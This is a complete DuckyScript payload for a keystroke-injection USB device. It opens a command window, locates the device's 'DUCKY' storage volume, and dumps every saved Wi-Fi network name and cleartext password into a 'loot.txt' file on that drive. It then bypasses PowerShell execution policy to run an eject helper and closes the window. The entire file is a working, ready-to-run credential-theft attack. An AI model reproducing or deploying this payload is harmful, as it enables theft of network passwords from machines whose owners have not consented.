ATTACKMODE HID STORAGE
DELAY 5000

REM Open CMD and keep it available while the report is generated.
GUI r
DELAY 1000
STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
ENTER
DELAY 1500

REM Find the drive letter of the DUCKY volume.
STRING for /f "delims=" %d in ('powershell -NoProfile -Command "(Get-Volume -FileSystemLabel 'DUCKY' | Select-Object -First 1).DriveLetter"') do @set "DUCKY=%d:"
ENTER
DELAY 1000

REM Write the Wi-Fi report. Run the helper only after CMD closes the output
REM handle. It flushes the cache, locks/dismounts the volume and requests eject.
STRING (for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | netsh wlan show profiles %j key=clear | findstr /C:"SSID name" /C:"Key Content") > "%DUCKY%\loot.txt" 2>&1
ENTER
DELAY 1500
STRING powershell -NoProfile -ExecutionPolicy Bypass -File "%DUCKY%\duckyscripts\helpers\SafeEject.ps1" -DriveLabel "DUCKY" & exit
ENTER

REM EvilKey returns to READY after receiving the safe-eject request.
DELAY 5000
